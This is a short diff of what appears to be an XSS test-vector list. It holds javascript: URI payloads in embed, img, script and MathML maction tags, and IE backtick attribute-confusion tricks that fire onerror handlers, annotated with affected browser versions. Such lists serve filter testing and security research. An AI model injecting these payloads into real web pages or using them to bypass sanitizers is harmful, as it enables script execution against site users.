@@ -1,3 +1,4 @@
-<embed src="javascript:alert(1)"></embed> // O10.10â, OM10.0â, GC6â, FF<img src="javascript:alert(909090)"><image src="javascript:alert(919191)"> // IE6, O10.10â, OM10.0â<script src="javascript:alert(3)"></script> // IE6, O11.01â, OM10.1â
+<embed src="javascript:alert(1)"></embed> // O10.10â, OM10.0â, GC6â, FF<img src="javascript:alert(909090)"><image src="javascript:alert(919191)">
+<script src="javascript:alert('this one')"></script>
 <!-- IE 5-8 standards mode --><a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(999999)></a>"><!-- IE 5-9 standards mode --><!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(22222)//"><?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(11111)//">
 <math href="javascript:alert(0)">CLICKME</math><math><!-- up to FF 13 --><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(333333)">CLICKME</maction><!-- FF 14+ --><maction actiontype="statusline" xlink:href="javascript:alert(1)">CLICKME<mtext>http://http://evil.url</mtext></maction></math>
